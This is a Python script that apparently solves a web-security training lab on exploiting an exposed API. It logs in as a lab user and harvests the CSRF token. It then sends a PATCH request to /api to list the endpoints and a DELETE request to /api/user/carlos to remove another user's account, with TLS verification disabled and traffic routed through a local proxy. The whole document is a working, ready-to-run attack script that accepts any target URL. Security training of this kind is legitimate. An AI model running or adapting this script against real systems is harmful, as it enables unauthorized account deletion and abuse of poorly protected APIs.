# Exploiting an API endpoint using documentation

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to connect to the application as Wiener...')
	login_path = url + '/login'
	time.sleep(1)
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	data_login = {'username': 'wiener', 'password': 'peter', 'csrf': csrf_token}
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		print('[+] Logged in as Wiener !')
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(-1)

def expose_api_endpoints(s, url):
	print('\n[+] Trying to expose /api endpoints using the PATCH method...')	
	expose_api_path = url + '/api'
	expose_api_data = {}
	r = s.patch(expose_api_path, data=expose_api_data)
	time.sleep(1)
	if r.status_code == 200:
		soup = BeautifulSoup(r.content, 'html.parser')
		endpoints = soup.find_all("td")
		for e in endpoints:
			print(e.get_text())

def delete_carlos(s, url):
	print('\n[+] Trying to delete Carlos user...')
	delete_path = url + '/api/user/carlos'
	r = s.delete(delete_path)
	time.sleep(1)
	if 'User deleted' in r.text:
		print('[+] Successfully removed Carlos user !')
	else:
		print('[-] Exploit failed to remove Carlos user <!>')
		sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting an API endpoint using documentation')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete Carlos user...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			time.sleep(2)

			connect_as_wiener(s, url)
			expose_api_endpoints(s, url)
			delete_carlos(s, url)

			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
